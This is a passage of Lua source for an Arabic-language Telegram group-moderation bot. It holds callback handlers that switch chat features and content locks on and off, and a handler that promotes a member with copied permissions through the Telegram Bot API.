{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockman' then
local Text = '• تم تفعيل نسبة الرجوله '
database:set(bot_id.."Cick:rjo"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opamanh' then
local Text = '• تم تعطيل نسبة الرجوله '
database:del(bot_id.."Cick:rjo"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/locknsak' then
local Text = '• تم تفعيل  نسبة الحب '
database:set(bot_id.."Cick:lov"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opanams' then
local Text = '• تم تعطيل  نسبة الحب '
database:del(bot_id.."Cick:lov"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/locknsamgk' then
local Text = '• تم تفعيل نسبه الانوثه '
database:set(bot_id.."Cick:ano"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opansamg' then
local Text = '• تم تعطيل نسبه الانوثه '
database:del(bot_id.."Cick:ano"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/locnspm' then
local Text = '• تم تفعيل نسبه الكره '
database:set(bot_id.."Cick:krh"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opansamp' then
local Text = '• تم تعطيل نسبه الكره '
database:del(bot_id.."Cick:krh"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockid' then
local Text = '• تم تفعيل الايدي '
database:set(bot_id.."Bot:Id"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opaid' then
local Text = '• تم تعطيل الايدي '
database:del(bot_id.."Bot:Id"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockgams' then
local Text = '• تم تفعيل الالعاب '
database:set(bot_id.."Lock:Games"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opagams' then
local Text = '• تم تعطيل الالعاب '
database:del(bot_id.."Lock:Games"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockbafne' then
local Text = '• تم تفعيل ضافني '
database:set(bot_id.."Added:Me"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opaVNOfe' then
local Text = '• تم تعطيل ضافني '
database:del(bot_id.."Added:Me"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockanmen' then
local Text = '• تم تفعيل انا مين '
database:set(bot_id.."my_anamen:status"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/oppganmen' then
local Text = '• تم تعطيل انا مين '
database:del(bot_id.."my_anamen:status"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Lokzal' then
local Text = '• تم تفعيل الزخرفه '
database:set(bot_id.." VNO:zhrf_Bots"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opeza' then
local Text = '• تم تعطيل الزخرفه '
database:del(bot_id.." VNO:zhrf_Bots"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lookpohi' then
local Text = '• تم تفعيل صورتي '
database:set(bot_id.."my_photo:status"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opphotop' then
local Text = '• تم تعطيل صورتي '
database:del(bot_id.."my_photo:status"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end







if Text == '/Loumarem' then
local Text = '• تم تفعيل مريم '
database:set(bot_id.."my_maryam:status"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/thomarem' then
local Text = '• تم تعطيل مريم '
database:del(bot_id.."my_maryam:status"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/locklinka' then
local Text = '• تم تفعيل الرابط '
database:set(bot_id.."Link_Group:status"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opalinka' then
local Text = '• تم تعطيل الرابط '
database:del(bot_id.."Link_Group:status"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockCick' then
local Text = '• تم تعطيل اطردني '
database:set(bot_id.."Cick:Me"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opCick' then
local Text = '• تم تفعيل اطردني '
database:del(bot_id.."Cick:Me"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/lockdul' then
local Text = '• تم قفل الاباحي '
database:set(bot_id.."lock:Lock:Sexy"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/oppor' then
local Text = '• تم فتح الاباحي '
database:del(bot_id.."lock:Lock:Sexy"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Louis' then
local Text = '• تم قفل السب '
database:set(bot_id.."lock:Fshar"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/tho' then
local Text = '• تم فتح السب '
database:del(bot_id.."lock:Fshar"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Gogh' then
local Text = '• تم قفل المحن '
database:set(bot_id.."lock:mahn"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Omni' then
local Text = '• تم فتح المحن '
database:del(bot_id.."lock:mahn"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Lokll' then
local Text = '• تم قفل الدردشه '
database:set(bot_id.."lock:text"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/openqg' then
local Text = '• تم فتح الدردشه '
database:del(bot_id.."lock:text"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockgwg' then
local Text = '• تم قفل الاضافه '
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opengwg' then
local Text = '• تم فتح الاضافه '
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockaghv' then
local Text = '• تم قفل الدخول '
database:set(bot_id.."lock:Join"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/oppgagf' then
local Text = '• تم فتح الدخول '
database:del(bot_id.."lock:Join"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockbot' then
local Text = '• تم قفل البوتات '
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opabot' then
local Text = '• تم فتح البوتات '
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockash' then
local Text = '• تم قفل الاشعارات '
database:set(bot_id.."lock:tagservr"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opaash' then
local Text = '• تم فتح الاشعارات '
database:del(bot_id.."lock:tagservr"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/locklink' then
local Text = '• تم قفل الروابط '
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opalink' then
local Text = '• تم فتح الروابط '
database:del(bot_id.."lock:Link"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockpin' then
local Text = '• تم قفل التثبيت '
database:set(bot_id.."lockpin"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opapin' then
local Text = '• تم فتح التثبيت '
database:del(bot_id.."lockpin"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockedit' then
local Text = '• تم قفل التعديل '
database:set(bot_id.."lock:edit"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opaedit' then
local Text = '• تم فتح التعديل '
database:del(bot_id.."lock:edit"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockFars' then
local Text = '• تم قفل الفارسيه '
database:set(bot_id.."lock:Fars"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opaFars' then
local Text = '• تم فتح الفارسيه '
database:del(bot_id.."lock:Fars"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockEngilsh' then
local Text = '• تم قفل الانكليزيه '
database:set(bot_id.."lock:Engilsh"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opaEngilsh' then
local Text = '• تم فتح الانكليزيه '
database:del(bot_id.."lock:Engilsh"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockinline' then
local Text = '• تم قفل الانلاين '
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opainline' then
local Text = '• تم فتح الانلاين '
database:del(bot_id.."lock:inline"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockeditmed' then
local Text = '• تم قفل تعديل الميديا '
database:set(bot_id.."lock_edit_med"..msg.chat_id_,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opaeditmed' then
local Text = '• تم فتح تعديل الميديا '
database:del(bot_id.."lock_edit_med"..msg.chat_id_)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end



if Text and Text:match('amr@(%d+)/user@(%d+)/setiinginfo') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/setiinginfo$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/voicetrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/voicetrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = '&can_manage_voice_chats=True'..manage..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/voicefalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/voicefalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
